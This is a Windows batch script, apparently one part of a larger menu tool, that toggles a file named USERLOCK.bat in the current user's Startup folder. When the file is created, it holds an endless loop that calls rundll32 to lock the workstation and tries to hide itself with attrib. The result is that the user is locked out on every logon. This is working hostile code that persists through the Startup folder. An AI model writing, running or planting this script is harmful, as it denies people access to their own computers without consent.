@echo off
set "target=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\USERLOCK.bat"

if exist "%target%" (
del /q "%target%"
) else (
  echo @echo off >> "%target%"
  echo :Loop >> "%target%"
   echo attrib +h USERLOCK.bat > nul >> "%target%"
  echo rundll32.exe user32.dll,LockWorkStation >> "%target%"
  echo goto Loop >> "%target%"
  echo exit >> "%target%"
 )

cd.. 
Main.bat